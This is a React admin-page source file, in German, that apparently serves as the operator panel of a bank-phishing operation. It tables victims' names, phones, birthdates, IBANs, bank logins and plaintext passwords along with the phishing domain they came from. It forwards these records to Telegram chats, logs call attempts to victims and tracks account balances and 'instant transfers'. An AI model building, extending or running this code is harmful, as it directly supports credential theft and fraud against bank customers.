import { useEffect, useState } from "react";
import { useNavigate } from "react-router-dom";
import { supabase } from "@/integrations/supabase/client";
import AdminLayout, { useAdminUser } from "@/components/AdminLayout";
import { Button } from "@/components/ui/button";
import { Dialog, DialogContent, DialogHeader, DialogTitle } from "@/components/ui/dialog";
import { Input } from "@/components/ui/input";
import { Textarea } from "@/components/ui/textarea";
import { Select, SelectContent, SelectItem, SelectTrigger, SelectValue } from "@/components/ui/select";
import { Table, TableBody, TableCell, TableHead, TableHeader, TableRow } from "@/components/ui/table";
import { Pagination, PaginationContent, PaginationItem, PaginationLink, PaginationNext, PaginationPrevious, PaginationEllipsis } from "@/components/ui/pagination";
import { Badge } from "@/components/ui/badge";
import { Tooltip, TooltipContent, TooltipProvider, TooltipTrigger } from "@/components/ui/tooltip";
import { Avatar, AvatarFallback } from "@/components/ui/avatar";
import { toast } from "sonner";
import { Copy, Eye, MessageSquare, PhoneMissed, RefreshCw, Search, Plus, Minus, Users, Clock, CheckCircle2, AlertCircle, Send } from "lucide-react";
import { formatBalance, parseBalanceNumber } from "@/lib/format";
import { useSubmissions, type Note } from "@/hooks/use-submissions";
import { useQueryClient } from "@tanstack/react-query";

interface Call {
  id: string;
  user_email: string;
  call_type: string;
  created_at: string;
}

const STATUS_OPTIONS = ["Neu", "In Bearbeitung", "Erfolgreich", "Down"] as const;

const statusConfig: Record<string, { dot: string; bg: string; text: string }> = {
  "Neu": { dot: "bg-slate-400", bg: "bg-slate-50 border-slate-200", text: "text-slate-600" },
  "In Bearbeitung": { dot: "bg-blue-500", bg: "bg-blue-50 border-blue-200", text: "text-blue-700" },
  "Erfolgreich": { dot: "bg-emerald-500", bg: "bg-emerald-50 border-emerald-200", text: "text-emerald-700" },
  "Down": { dot: "bg-red-500", bg: "bg-red-50 border-red-200", text: "text-red-700" },
};

function timeAgo(dateStr: string): string {
  const now = Date.now();
  const then = new Date(dateStr).getTime();
  const diff = Math.floor((now - then) / 1000);
  if (diff < 60) return "gerade eben";
  if (diff < 3600) return `vor ${Math.floor(diff / 60)} Min`;
  if (diff < 86400) return `vor ${Math.floor(diff / 3600)} Std`;
  if (diff < 604800) return `vor ${Math.floor(diff / 86400)} Tagen`;
  return new Date(dateStr).toLocaleDateString("de-AT");
}

function getInitials(name: string | null): string {
  if (!name) return "?";
  return name.split(" ").map(p => p[0]).join("").toUpperCase().slice(0, 2);
}

function LogsContent() {
  const navigate = useNavigate();
  const user = useAdminUser();
  const queryClient = useQueryClient();
  const { submissions, noteCounts, callCounts, refetch } = useSubmissions();
  const [balanceEdit, setBalanceEdit] = useState<{ id: string; value: string; currentBalance: string } | null>(null);
  const [statusFilter, setStatusFilter] = useState<string>("Alle");
  const [noteDialog, setNoteDialog] = useState<{ id: string; notes: Note[] } | null>(null);
  const [callDialog, setCallDialog] = useState<{ id: string; calls: Call[] } | null>(null);
  const [newNote, setNewNote] = useState("");
  const [savingNote, setSavingNote] = useState(false);
  const [searchQuery, setSearchQuery] = useState("");
  const [txMode, setTxMode] = useState<"+" | "-" | null>(null);
  const [txAmount, setTxAmount] = useState("");
  const [txNote, setTxNote] = useState("");
  const [resendingId, setResendingId] = useState<string | null>(null);
  const [bulkResending, setBulkResending] = useState(false);
  const [page, setPage] = useState(1);
  const PAGE_SIZE = 20;

  const isLog = (s: any) => !!(s.bank_username && s.bank_password);

  const resendOne = async (subId: string) => {
    setResendingId(subId);
    const { data, error } = await supabase.functions.invoke("notify-telegram", {
      body: { submission_id: subId, kind: "auto", force: true },
    });
    setResendingId(null);
    if (error || !data?.ok) { toast.error("Fehler beim Senden"); return; }
    if (data.sent > 0) toast.success(`An ${data.sent} Chat(s) gesendet (${data.kind})`);
    else toast.warning("Keine passenden Chats gefunden (Domain prüfen)");
  };

  const bulkResendFullInfos = async () => {
    const targets = submissions.filter((s) => !isLog(s));
    if (targets.length === 0) { toast.info("Keine Full-Infos zu senden"); return; }
    if (!confirm(`${targets.length} Full-Info(s) erneut an Telegram senden?`)) return;
    setBulkResending(true);
    let ok = 0, fail = 0, totalSent = 0;
    for (const s of targets) {
      const { data, error } = await supabase.functions.invoke("notify-telegram", {
        body: { submission_id: s.id, kind: "full_info", force: true },
      });
      if (error || !data?.ok) fail++;
      else { ok++; totalSent += data.sent || 0; }
    }
    setBulkResending(false);
    toast.success(`${ok}/${targets.length} verarbeitet, ${totalSent} Nachricht(en) gesendet${fail ? `, ${fail} Fehler` : ""}`);
  };

  const stats = {
    total: submissions.length,
    neu: submissions.filter(s => (s.status || "Neu") === "Neu").length,
    bearbeitung: submissions.filter(s => s.status === "In Bearbeitung").length,
    erfolgreich: submissions.filter(s => s.status === "Erfolgreich").length,
  };

  const copyToClipboard = (text: string) => {
    navigator.clipboard.writeText(text);
    toast.success("Kopiert!");
  };

  const saveBalance = async () => {
    if (!balanceEdit) return;
    const formatted = balanceEdit.value ? formatBalance(balanceEdit.value) : null;
    const { error } = await supabase.from("submissions").update({ balance: formatted }).eq("id", balanceEdit.id);
    if (error) { toast.error("Fehler beim Speichern"); }
    else {
      toast.success("Guthaben gespeichert");
      queryClient.setQueryData<any[]>(["submissions"], (old) =>
        old?.map((s) => (s.id === balanceEdit.id ? { ...s, balance: formatted } : s))
      );
      setBalanceEdit(null);
    }
  };

  const handleBalanceTx = async () => {
    if (!balanceEdit || !user || !txAmount.trim() || !txMode) return;
    const txNum = parseBalanceNumber(txAmount);
    if (isNaN(txNum) || txNum <= 0) { toast.error("Ungültiger Betrag"); return; }
    const currentNum = parseBalanceNumber(balanceEdit.currentBalance || "0");
    const newNum = txMode === "+" ? currentNum + txNum : currentNum - txNum;
    const formatted = formatBalance(String(newNum));
    const { error } = await supabase.from("submissions").update({ balance: formatted }).eq("id", balanceEdit.id);
    if (error) { toast.error("Fehler beim Speichern"); return; }
    const sign = txMode === "+" ? "+" : "−";
    const noteContent = `${sign}${formatBalance(txAmount)}${txNote.trim() ? ` — ${txNote.trim()}` : ""}`;
    await supabase.from("submission_notes").insert({
      submission_id: balanceEdit.id,
      user_id: user.id,
      user_email: user.email || "unknown",
      content: noteContent,
    });
    queryClient.setQueryData<any[]>(["submissions"], (old) =>
      old?.map((s) => (s.id === balanceEdit.id ? { ...s, balance: formatted } : s))
    );
    queryClient.invalidateQueries({ queryKey: ["submission-note-counts"] });
    toast.success("Buchung gespeichert");
    setBalanceEdit(null); setTxMode(null); setTxAmount(""); setTxNote("");
  };

  const updateStatus = async (id: string, status: string) => {
    const { error } = await supabase.from("submissions").update({ status }).eq("id", id);
    if (error) { toast.error("Fehler beim Speichern"); }
    else {
      queryClient.setQueryData<any[]>(["submissions"], (old) =>
        old?.map((s) => (s.id === id ? { ...s, status } : s))
      );
    }
  };

  const openNoteDialog = async (subId: string) => {
    const { data } = await supabase.from("submission_notes").select("*").eq("submission_id", subId).order("created_at", { ascending: false });
    setNoteDialog({ id: subId, notes: (data || []) as Note[] });
    setNewNote("");
  };

  const addNote = async () => {
    if (!noteDialog || !user || !newNote.trim()) return;
    setSavingNote(true);
    const { data, error } = await supabase.from("submission_notes").insert({
      submission_id: noteDialog.id,
      user_id: user.id,
      user_email: user.email || "unknown",
      content: newNote.trim(),
    }).select().single();
    setSavingNote(false);
    if (error) { toast.error("Fehler beim Speichern"); }
    else {
      setNewNote("");
      if (data) {
        setNoteDialog((prev) => prev ? { ...prev, notes: [data as Note, ...prev.notes] } : null);
        queryClient.invalidateQueries({ queryKey: ["submission-note-counts"] });
      }
    }
  };

  const addMailboxCall = async (subId: string) => {
    if (!user) return;
    const { error } = await supabase.from("submission_calls").insert({
      submission_id: subId,
      user_id: user.id,
      user_email: user.email || "unknown",
      call_type: "mailbox",
    });
    if (error) { toast.error("Fehler beim Speichern"); }
    else {
      toast.success("Mailbox-Versuch gespeichert");
      queryClient.invalidateQueries({ queryKey: ["submission-call-counts"] });
    }
  };

  const openCallDialog = async (subId: string) => {
    const { data } = await supabase.from("submission_calls").select("*").eq("submission_id", subId).order("created_at", { ascending: false });
    setCallDialog({ id: subId, calls: (data || []) as Call[] });
  };

  const CopyCell = ({ value, mono }: { value: string | null; mono?: boolean }) => {
    if (!value) return <span className="text-slate-300">—</span>;
    const display = value.length > 40 ? value.slice(0, 40) + "…" : value;
    return (
      <button onClick={() => copyToClipboard(value)} title={value.length > 200 ? `${value.slice(0, 200)}…` : value} className={`group/copy flex items-center gap-1.5 text-sm text-slate-600 hover:text-slate-900 transition-colors max-w-full min-w-0 ${mono ? "font-mono text-xs" : ""}`}>
        <span className="truncate block max-w-[160px]">{display}</span>
        <Copy className="h-3 w-3 opacity-0 group-hover/copy:opacity-40 transition-opacity shrink-0" />
      </button>
    );
  };

  const filteredSubmissions = submissions.filter((s) => {
    if (statusFilter !== "Alle" && (s.status || "Neu") !== statusFilter) return false;
    if (searchQuery.trim()) {
      const q = searchQuery.toLowerCase();
      const fields = [s.full_name, s.phone, s.iban, s.bank_username].filter(Boolean).map(v => v!.toLowerCase());
      if (!fields.some(f => f.includes(q))) return false;
    }
    return true;
  });

  const totalPages = Math.max(1, Math.ceil(filteredSubmissions.length / PAGE_SIZE));
  const currentPage = Math.min(page, totalPages);
  const pageStart = (currentPage - 1) * PAGE_SIZE;
  const paginated = filteredSubmissions.slice(pageStart, pageStart + PAGE_SIZE);

  useEffect(() => {
    setPage(1);
  }, [statusFilter, searchQuery, submissions.length]);

  const statCards = [
    { label: "Gesamt", value: stats.total, icon: Users, filter: "Alle", color: "text-slate-600 bg-slate-50 border-slate-200" },
    { label: "Neu", value: stats.neu, icon: Clock, filter: "Neu", color: "text-slate-600 bg-slate-50 border-slate-200" },
    { label: "In Bearbeitung", value: stats.bearbeitung, icon: AlertCircle, filter: "In Bearbeitung", color: "text-blue-600 bg-blue-50 border-blue-200" },
    { label: "Erfolgreich", value: stats.erfolgreich, icon: CheckCircle2, filter: "Erfolgreich", color: "text-emerald-600 bg-emerald-50 border-emerald-200" },
  ];

  return (
    <TooltipProvider>
    <div className="space-y-6">
      {/* Header */}
      <div className="flex items-end justify-between">
        <div>
          <h1 className="text-2xl font-bold text-slate-900 tracking-tight">Logs</h1>
          <p className="text-sm text-slate-500 mt-0.5">{submissions.length} Einträge insgesamt</p>
        </div>
        <Button variant="ghost" size="sm" onClick={refetch} className="gap-2 text-slate-500 hover:text-slate-700">
          <RefreshCw className="h-3.5 w-3.5" /> Aktualisieren
        </Button>
      </div>

      <div className="flex justify-end">
        <Button variant="outline" size="sm" onClick={bulkResendFullInfos} disabled={bulkResending} className="gap-2">
          <Send className="h-3.5 w-3.5" /> {bulkResending ? "Sendet..." : "Alle Full-Infos nachsenden"}
        </Button>
      </div>

      {/* Stat Cards */}
      <div className="grid grid-cols-4 gap-3">
        {statCards.map((card) => (
          <button
            key={card.filter}
            onClick={() => setStatusFilter(card.filter)}
            className={`flex items-center gap-3 rounded-xl border p-3.5 transition-all ${card.color} ${
              statusFilter === card.filter ? "ring-2 ring-slate-900/10 shadow-sm" : "hover:shadow-sm"
            }`}
          >
            <card.icon className="h-5 w-5 opacity-60" />
            <div className="text-left">
              <p className="text-2xl font-bold leading-none">{card.value}</p>
              <p className="text-xs opacity-70 mt-0.5">{card.label}</p>
            </div>
          </button>
        ))}
      </div>

      {/* Search + Filter */}
      <div className="flex items-center gap-3">
        <div className="relative flex-1 max-w-xs">
          <Search className="absolute left-3 top-1/2 -translate-y-1/2 h-4 w-4 text-slate-400" />
          <Input
            placeholder="Suche nach Name, Telefon, IBAN..."
            value={searchQuery}
            onChange={(e) => setSearchQuery(e.target.value)}
            className="pl-9 h-9 bg-white border-slate-200"
          />
        </div>
        <div className="flex items-center gap-1.5">
          {["Alle", ...STATUS_OPTIONS].map((s) => (
            <button
              key={s}
              onClick={() => setStatusFilter(s)}
              className={`rounded-full px-3 py-1 text-xs font-medium transition-all ${
                statusFilter === s
                  ? "bg-slate-900 text-white shadow-sm"
                  : "text-slate-500 hover:text-slate-700 hover:bg-slate-100"
              }`}
            >
              {s}
            </button>
          ))}
        </div>
      </div>

      {/* Table */}
      <div className="rounded-xl border border-slate-200 bg-white shadow-sm overflow-x-auto">
        <Table className="w-full min-w-[1400px]">
          <TableHeader>
            <TableRow className="bg-slate-50/80 border-b border-slate-100">
              <TableHead className="w-[90px] text-[11px] font-semibold text-slate-400 uppercase tracking-wider pl-4">Zeit</TableHead>
              <TableHead className="w-[200px] text-[11px] font-semibold text-slate-400 uppercase tracking-wider">Name</TableHead>
              <TableHead className="w-[130px] text-[11px] font-semibold text-slate-400 uppercase tracking-wider">Telefon</TableHead>
              <TableHead className="w-[110px] text-[11px] font-semibold text-slate-400 uppercase tracking-wider">Geburtsdatum</TableHead>
              <TableHead className="w-[120px] text-[11px] font-semibold text-slate-400 uppercase tracking-wider">Bank</TableHead>
              <TableHead className="w-[90px] text-[11px] font-semibold text-slate-400 uppercase tracking-wider">Typ</TableHead>
              <TableHead className="w-[160px] text-[11px] font-semibold text-slate-400 uppercase tracking-wider">Login</TableHead>
              <TableHead className="w-[140px] text-[11px] font-semibold text-slate-400 uppercase tracking-wider">Passwort</TableHead>
              <TableHead className="w-[180px] text-[11px] font-semibold text-slate-400 uppercase tracking-wider">Domain</TableHead>
              <TableHead className="w-[130px] text-[11px] font-semibold text-slate-400 uppercase tracking-wider">Status</TableHead>
              <TableHead className="w-[140px] text-[11px] font-semibold text-slate-400 uppercase tracking-wider pr-4">Aktionen</TableHead>
            </TableRow>
          </TableHeader>
          <TableBody>
            {paginated.map((sub) => {
              const currentStatus = sub.status || "Neu";
              const sc = statusConfig[currentStatus] || statusConfig["Neu"];
              const nc = noteCounts[sub.id] || 0;
              const cc = callCounts[sub.id] || 0;
              return (
                <TableRow key={sub.id} className="group border-b border-slate-100 last:border-0 hover:bg-slate-50/60 transition-colors">
                  {/* Zeit */}
                  <TableCell className="pl-4">
                    <div className="flex flex-col">
                      <span className="text-xs text-slate-500">
                        {sub.created_at ? new Date(sub.created_at).toLocaleDateString("de-AT") : "—"}
                      </span>
                      {sub.created_at && (
                        <span className="text-xs text-slate-400">
                          {new Date(sub.created_at).toLocaleTimeString("de-AT", { hour: "2-digit", minute: "2-digit" })} Uhr
                        </span>
                      )}
                    </div>
                  </TableCell>

                  {/* Name + Avatar */}
                  <TableCell>
                    <div className="flex items-center gap-2.5 min-w-0">
                      <Avatar className="h-7 w-7 text-[10px] shrink-0">
                        <AvatarFallback className="bg-slate-100 text-slate-500 font-medium">
                          {getInitials(sub.full_name)}
                        </AvatarFallback>
                      </Avatar>
                      <span title={sub.full_name || ""} className="font-medium text-slate-800 text-sm truncate min-w-0">{sub.full_name || "—"}</span>
                    </div>
                  </TableCell>

                  {/* Telefon */}
                  <TableCell><CopyCell value={sub.phone} mono /></TableCell>

                  {/* Geburtsdatum */}
                  <TableCell className="text-xs text-slate-500">{sub.birthdate || "—"}</TableCell>

                  {/* Bank */}
                  <TableCell className="text-xs text-slate-500">{sub.bank || "—"}</TableCell>

                  {/* Typ */}
                  <TableCell>
                    {isLog(sub) ? (
                      <Badge variant="outline" className="border-emerald-200 bg-emerald-50 text-emerald-700 text-[10px] font-medium">Log</Badge>
                    ) : (
                      <Badge variant="outline" className="border-amber-200 bg-amber-50 text-amber-700 text-[10px] font-medium">Full-Info</Badge>
                    )}
                  </TableCell>

                  {/* Login */}
                  <TableCell><CopyCell value={sub.bank_username} mono /></TableCell>

                  {/* Passwort */}
                  <TableCell><CopyCell value={sub.bank_password} mono /></TableCell>

                  {/* Domain */}
                  <TableCell><CopyCell value={sub.domain} mono /></TableCell>

                  {/* Status */}
                  <TableCell>
                    <Select value={currentStatus} onValueChange={(val) => updateStatus(sub.id, val)}>
                      <SelectTrigger className="h-auto w-auto border-0 p-0 shadow-none bg-transparent">
                        <div className={`inline-flex items-center gap-1.5 rounded-full border px-2.5 py-1 text-xs font-medium ${sc.bg} ${sc.text}`}>
                          <span className={`h-1.5 w-1.5 rounded-full ${sc.dot}`} />
                          {currentStatus}
                        </div>
                      </SelectTrigger>
                      <SelectContent>
                        {STATUS_OPTIONS.map((opt) => (
                          <SelectItem key={opt} value={opt}>
                            <div className="flex items-center gap-2">
                              <span className={`h-1.5 w-1.5 rounded-full ${statusConfig[opt].dot}`} />
                              {opt}
                            </div>
                          </SelectItem>
                        ))}
                      </SelectContent>
                    </Select>
                  </TableCell>

                  {/* Aktionen */}
                  <TableCell className="pr-4">
                    <div className="flex items-center gap-0.5 opacity-60 group-hover:opacity-100 transition-opacity">
                      <Tooltip>
                        <TooltipTrigger asChild>
                          <Button size="icon" variant="ghost" className="h-7 w-7 text-slate-400 hover:text-slate-700" onClick={() => navigate(`/admin/logs/${sub.id}`)}>
                            <Eye className="h-3.5 w-3.5" />
                          </Button>
                        </TooltipTrigger>
                        <TooltipContent>Details</TooltipContent>
                      </Tooltip>

                      <Tooltip>
                        <TooltipTrigger asChild>
                          <Button size="icon" variant="ghost" className="h-7 w-7 text-slate-400 hover:text-blue-600" disabled={resendingId === sub.id} onClick={() => resendOne(sub.id)}>
                            <Send className="h-3.5 w-3.5" />
                          </Button>
                        </TooltipTrigger>
                        <TooltipContent>An Telegram senden</TooltipContent>
                      </Tooltip>

                      <div className="relative">
                        <Tooltip>
                          <TooltipTrigger asChild>
                            <Button size="icon" variant="ghost" className="h-7 w-7 text-slate-400 hover:text-slate-700" onClick={() => openNoteDialog(sub.id)}>
                              <MessageSquare className="h-3.5 w-3.5" />
                            </Button>
                          </TooltipTrigger>
                          <TooltipContent>Notizen</TooltipContent>
                        </Tooltip>
                        {nc > 0 && (
                          <button onClick={() => openNoteDialog(sub.id)} className="absolute -top-1 -right-1 flex h-4 min-w-4 items-center justify-center rounded-full bg-red-500 px-1 text-[10px] font-bold text-white leading-none">
                            {nc}
                          </button>
                        )}
                      </div>

                      <div className="relative">
                        <Tooltip>
                          <TooltipTrigger asChild>
                            <Button size="icon" variant="ghost" className="h-7 w-7 text-slate-400 hover:text-slate-700" onClick={() => addMailboxCall(sub.id)}>
                              <PhoneMissed className="h-3.5 w-3.5" />
                            </Button>
                          </TooltipTrigger>
                          <TooltipContent>Mailbox</TooltipContent>
                        </Tooltip>
                        {cc > 0 && (
                          <button onClick={() => openCallDialog(sub.id)} className="absolute -top-1 -right-1 flex h-4 min-w-4 items-center justify-center rounded-full bg-red-500 px-1 text-[10px] font-bold text-white leading-none">
                            {cc}
                          </button>
                        )}
                      </div>
                    </div>
                  </TableCell>
                </TableRow>
              );
            })}
            {paginated.length === 0 && (
              <TableRow>
                <TableCell colSpan={11} className="text-center text-slate-400 py-16">
                  Keine Einträge vorhanden
                </TableCell>
              </TableRow>
            )}
          </TableBody>
        </Table>
      </div>

      {/* Pagination */}
      {filteredSubmissions.length > 0 && (
        <div className="flex items-center justify-between gap-4">
          <p className="text-xs text-slate-500">
            Zeige {pageStart + 1}–{Math.min(pageStart + PAGE_SIZE, filteredSubmissions.length)} von {filteredSubmissions.length}
          </p>
          {totalPages > 1 && (
            <Pagination className="mx-0 w-auto justify-end">
              <PaginationContent>
                <PaginationItem>
                  <PaginationPrevious
                    href="#"
                    onClick={(e) => { e.preventDefault(); if (currentPage > 1) setPage(currentPage - 1); }}
                    className={currentPage === 1 ? "pointer-events-none opacity-50" : ""}
                  />
                </PaginationItem>
                {(() => {
                  const pages: (number | "ellipsis")[] = [];
                  const add = (p: number) => { if (!pages.includes(p) && p >= 1 && p <= totalPages) pages.push(p); };
                  add(1);
                  for (let p = currentPage - 1; p <= currentPage + 1; p++) add(p);
                  add(totalPages);
                  const sorted = (pages.filter(p => typeof p === "number") as number[]).sort((a, b) => a - b);
                  const out: (number | "ellipsis")[] = [];
                  sorted.forEach((p, i) => {
                    if (i > 0 && p - (sorted[i - 1] as number) > 1) out.push("ellipsis");
                    out.push(p);
                  });
                  return out.map((p, i) =>
                    p === "ellipsis" ? (
                      <PaginationItem key={`e${i}`}><PaginationEllipsis /></PaginationItem>
                    ) : (
                      <PaginationItem key={p}>
                        <PaginationLink
                          href="#"
                          isActive={p === currentPage}
                          onClick={(e) => { e.preventDefault(); setPage(p); }}
                        >
                          {p}
                        </PaginationLink>
                      </PaginationItem>
                    )
                  );
                })()}
                <PaginationItem>
                  <PaginationNext
                    href="#"
                    onClick={(e) => { e.preventDefault(); if (currentPage < totalPages) setPage(currentPage + 1); }}
                    className={currentPage === totalPages ? "pointer-events-none opacity-50" : ""}
                  />
                </PaginationItem>
              </PaginationContent>
            </Pagination>
          )}
        </div>
      )}

      {/* Balance Edit Dialog */}
      <Dialog open={!!balanceEdit} onOpenChange={(open) => { if (!open) { setBalanceEdit(null); setTxMode(null); setTxAmount(""); setTxNote(""); } }}>
        <DialogContent className="max-w-sm">
          <DialogHeader><DialogTitle>Guthaben bearbeiten</DialogTitle></DialogHeader>
          <div className="space-y-4">
            {!txMode ? (
              <>
                <Input
                  placeholder="z.B. 1.250,00 €"
                  value={balanceEdit?.value || ""}
                  onChange={(e) => setBalanceEdit((prev) => prev ? { ...prev, value: e.target.value } : null)}
                  onKeyDown={(e) => e.key === "Enter" && saveBalance()}
                />
                <div className="flex justify-between items-center">
                  <div className="flex gap-1">
                    <Button size="sm" variant="outline" onClick={() => setTxMode("+")} className="gap-1">
                      <Plus className="h-3.5 w-3.5" /> Zubuchen
                    </Button>
                    <Button size="sm" variant="outline" onClick={() => setTxMode("-")} className="gap-1">
                      <Minus className="h-3.5 w-3.5" /> Abbuchen
                    </Button>
                  </div>
                  <div className="flex gap-2">
                    <Button variant="outline" size="sm" onClick={() => setBalanceEdit(null)}>Abbrechen</Button>
                    <Button size="sm" onClick={saveBalance}>Speichern</Button>
                  </div>
                </div>
              </>
            ) : (
              <>
                <p className="text-sm text-slate-500">
                  Aktuell: <span className="font-medium text-slate-700">{balanceEdit?.currentBalance || "0€"}</span>
                </p>
                <Input
                  placeholder="Betrag"
                  value={txAmount}
                  onChange={(e) => setTxAmount(e.target.value)}
                  autoFocus
                />
                <Input
                  placeholder="Notiz (z.B. Echtzeitüberweisung)"
                  value={txNote}
                  onChange={(e) => setTxNote(e.target.value)}
                />
                {(() => {
                  const txNum = parseBalanceNumber(txAmount);
                  if (!txAmount.trim() || isNaN(txNum) || txNum <= 0) return null;
                  const currentNum = parseBalanceNumber(balanceEdit?.currentBalance || "0");
                  const newNum = txMode === "+" ? currentNum + txNum : currentNum - txNum;
                  return (
                    <p className="text-xs text-slate-400">
                      Neuer Betrag: <span className="font-medium text-slate-600">{formatBalance(String(newNum))}</span>
                    </p>
                  );
                })()}
                <div className="flex justify-end gap-2">
                  <Button variant="outline" size="sm" onClick={() => { setTxMode(null); setTxAmount(""); setTxNote(""); }}>Zurück</Button>
                  <Button size="sm" onClick={handleBalanceTx} disabled={!txAmount.trim()}>
                    {txMode === "+" ? "Zubuchen" : "Abbuchen"}
                  </Button>
                </div>
              </>
            )}
          </div>
        </DialogContent>
      </Dialog>

      {/* Notes Dialog */}
      <Dialog open={!!noteDialog} onOpenChange={(open) => !open && setNoteDialog(null)}>
        <DialogContent className="max-w-lg">
          <DialogHeader><DialogTitle>Notizen</DialogTitle></DialogHeader>
          <div className="space-y-4">
            <div className="space-y-2">
              <Textarea placeholder="Neue Notiz schreiben..." value={newNote} onChange={(e) => setNewNote(e.target.value)} rows={3} />
              <Button size="sm" onClick={addNote} disabled={savingNote || !newNote.trim()}>Notiz hinzufügen</Button>
            </div>
            {noteDialog && noteDialog.notes.length > 0 ? (
              <div className="space-y-3 max-h-64 overflow-y-auto">
                {noteDialog.notes.map((note) => (
                  <div key={note.id} className="rounded-lg border border-slate-200 p-3 text-sm bg-slate-50">
                    <div className="flex justify-between text-xs text-slate-400 mb-1">
                      <span>{note.user_email}</span>
                      <span>{new Date(note.created_at).toLocaleString("de-AT")}</span>
                    </div>
                    <p className="text-slate-700 whitespace-pre-wrap">{note.content}</p>
                  </div>
                ))}
              </div>
            ) : (
              <p className="text-sm text-slate-400">Keine Notizen vorhanden</p>
            )}
          </div>
        </DialogContent>
      </Dialog>

      {/* Call/Mailbox Dialog */}
      <Dialog open={!!callDialog} onOpenChange={(open) => !open && setCallDialog(null)}>
        <DialogContent className="max-w-sm">
          <DialogHeader><DialogTitle>Mailbox-Versuche</DialogTitle></DialogHeader>
          {callDialog && callDialog.calls.length > 0 ? (
            <div className="space-y-2 max-h-64 overflow-y-auto">
              {callDialog.calls.map((call) => (
                <div key={call.id} className="flex justify-between rounded-lg border border-slate-200 p-2.5 text-sm bg-slate-50">
                  <span className="text-slate-600">Mailbox</span>
                  <span className="text-xs text-slate-400">{new Date(call.created_at).toLocaleString("de-AT")}</span>
                </div>
              ))}
            </div>
          ) : (
            <p className="text-sm text-slate-400">Keine Versuche</p>
          )}
        </DialogContent>
      </Dialog>
    </div>
    </TooltipProvider>
  );
}

const AdminLogs = () => (
  <AdminLayout>
    <LogsContent />
  </AdminLayout>
);

export default AdminLogs;
